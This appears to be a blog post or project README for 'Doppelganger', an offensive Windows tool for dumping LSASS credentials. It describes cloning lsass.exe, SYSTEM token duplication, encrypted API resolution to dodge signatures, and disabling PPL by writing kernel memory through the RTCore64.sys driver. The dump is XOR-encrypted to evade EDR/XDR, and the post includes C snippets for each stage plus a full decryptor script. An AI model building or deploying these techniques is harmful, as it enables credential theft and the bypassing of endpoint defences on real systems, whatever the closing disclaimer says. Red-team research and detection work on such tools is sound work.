---
title: "Doppelganger"
date: 2025-04-02T15:28:21+02:00
draft: false
---

# Doppelganger Program: An Advanced LSASS Dumper with Process Cloning

## Author: vari.sh

---

![Doppelganger](/images/doppelganger.png)

## Overview

The **Doppelganger Program** is an advanced Windows utility designed to obtain an LSASS (Local Security Authority Subsystem Service) dump from a cloned process, rather than the original one. By using process cloning techniques, the tool aims to bypass PPL (Process Protected Light), VBS (Virtualization Based Security), EDR/XDR detection mechanisms that typically monitor interactions with `lsass.exe`.

The program achieves this by:
- Obtaining a SYSTEM token through token duplication.
- Loading clean versions of Windows DLLs to avoid detection.
- Cloning the LSASS process using `NtCreateProcessEx`.
- Disabling PPL (Protected Process Light) protection on `lsass.exe`.
- Creating an LSASS dump using `MiniDumpWriteDump()`.
- Encrypting the dump file using XOR encryption to further avoid detection.

---

## Features

- **Process Cloning:** Uses `NtCreateProcessEx` to clone `lsass.exe` and avoid detection.
- **XOR Encryption:** Dumps are encrypted with a predefined XOR key before being written to disk.
- **Driver Interaction:** Leverages `RTCore64.sys` for direct memory access to disable PPL.
- **Token Manipulation:** Elevates to SYSTEM privileges to access LSASS.
- **DLL Offuscation:** Loads DLLs using encrypted strings to bypass signature-based detections.

---

## Installation

The Doppelganger Program is written in C and is intended to be compiled using Visual Studio. The repository is structured as follows:

```
doppelganger/
│
├── includes/          # Header files (.h)
├── src/               # Source files (.c)
├── build/             # Output binaries
├── utils/             # Utility scripts (e.g., decryptor)
└── README.md          # Documentation
```

### Compilation

Compile the project in Visual Studio using the provided solution file.
Ensure to have the `RTCore64.sys` driver present and accessible by the program.

---

## Code Breakdown

### 1. Resolving APIs

The tool resolves critical Windows APIs by decrypting their names from encrypted strings and dynamically loading them with `CustomGetProcAddress()`.

```c
// Example of resolving API pointers
BOOL success =
    ResolveApiFromDll(hKernel32, P32F_ENC, sizeof(P32F_ENC), (void**)&pP32F) &&
    ResolveApiFromDll(hNtdll, NTCPE_ENC, sizeof(NTCPE_ENC), (void**)&pNTCPX) &&
    ResolveApiFromDll(hAdvapi32, OPTK_ENC, sizeof(OPTK_ENC), (void**)&pOPTK);

if (!success) {
    log_error("Failed to resolve one or more APIs.");
    return FALSE;
}
```

### 2. Token Duplication

To interact with `lsass.exe`, the tool impersonates SYSTEM using duplicated tokens.

```c
HANDLE hSystemToken = NULL;
if (!GetSystemTokenAndDuplicate(&hSystemToken)) {
    log_error("Failed to duplicate SYSTEM token.");
    return 1;
}
```

### 3. Process Cloning

Using `NtCreateProcessEx`, the tool creates a clone of `lsass.exe`.

```c
NTSTATUS status = pNTCPX(
    &hClone,
    PROCESS_ALL_ACCESS,
    &objAttr,
    hLsass,
    0,
    NULL,
    NULL,
    NULL,
    FALSE
);
```

### 4. Disabling PPL

Protected Process Light (PPL) protection is disabled by directly modifying memory using the `RTCore64.sys` driver.

```c
WriteMemoryPrimitive(Device, 1, eproc + offs.Protection - 2, 0x00); // SignatureLevel
WriteMemoryPrimitive(Device, 1, eproc + offs.Protection - 1, 0x00); // SectionSignatureLevel
WriteMemoryPrimitive(Device, 1, eproc + offs.Protection, 0x00); // Protection
log_success("PPL disabled (0x00 written)");
```

After the cloning, the values will be restored.

### 5. Creating the Dump

Finally, a memory dump of the cloned `lsass.exe` process is created and encrypted.

```c
BOOL dumped = pMDWD(
    hClone,
    clonedPID,
    hTempFile,
    MiniDumpWithFullMemory,
    NULL,
    NULL,
    NULL
);
```

---

## Decryption

A simple Python script is provided to decrypt the dumped files.

```python
import sys

XOR_KEY = b"0123456789abcdefghij"

def xor_decrypt(data: bytes, key: bytes) -> bytes:
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <xor_dump_path>")
        sys.exit(1)

    encrypted_path = sys.argv[1]
    output_path = encrypted_path + ".dec"

    with open(encrypted_path, "rb") as f:
        data = f.read()

    decrypted = xor_decrypt(data, XOR_KEY)

    with open(output_path, "wb") as f:
        f.write(decrypted)

    print(f"Decryption successful. Output written to: {output_path}")

if __name__ == "__main__":
    main()
```

---

## Conclusion

The Doppelganger Program demonstrates how process cloning, API obfuscation, and memory manipulation can be used to bypass traditional detection mechanisms. The combination of techniques makes it effective at retrieving sensitive memory data even on systems protected by anti-tampering mechanisms.

---

## Disclaimer

This project is for educational purposes only. Use responsibly and only in environments where you have explicit permission to test security mechanisms.

